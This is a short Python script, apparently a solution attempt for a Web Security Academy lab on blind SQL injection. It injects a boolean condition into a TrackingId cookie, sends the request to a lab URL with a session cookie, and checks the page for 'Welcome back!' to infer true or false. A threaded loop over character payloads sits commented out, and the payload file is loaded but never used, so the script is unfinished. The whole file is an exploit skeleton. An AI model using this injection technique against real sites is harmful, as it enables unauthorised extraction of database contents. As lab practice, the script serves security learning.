import requests
import threading
import re

def getPayload():
	payloads = []
	with open("./asciiChars.txt", "r") as f:
		payloads = f.read().split('\n')

	return payloads

def sendGetRequest(domain, payload):
	parameters = {}
	headers = {}
	cookies = { 'TrackingId':'PMIIyAp7oToqqkd1\'+AND+\'1\'=\'2',
				'session':'J2O16Q54nWSn1T3z9ep0mxe68lsJKXqY'}

	r = requests.get(domain, cookies=cookies)
	return r

payloads = getPayload()
domain = 'https://ac001f8b1f19565980084f0d006b00e5.web-security-academy.net/'

def sendIt(payload):
	response = sendGetRequest(domain, payload)
	print(response.status_code)
	match = response.text
	print('===============================================================')
	if match.find('Welcome back!') == -1:
		print("didnt find it")
	else:
		print('found it')

#for payload in payloads:
#	print(payload)
sendIt(payloads[0])

'''
threads = []

for payload in payloads:
	t = threading.Thread(target=sendIt, args=[payload])
	threads.append(t)

for t in threads:
	t.start()

for t in threads:
	t.join()

print('Success')
'''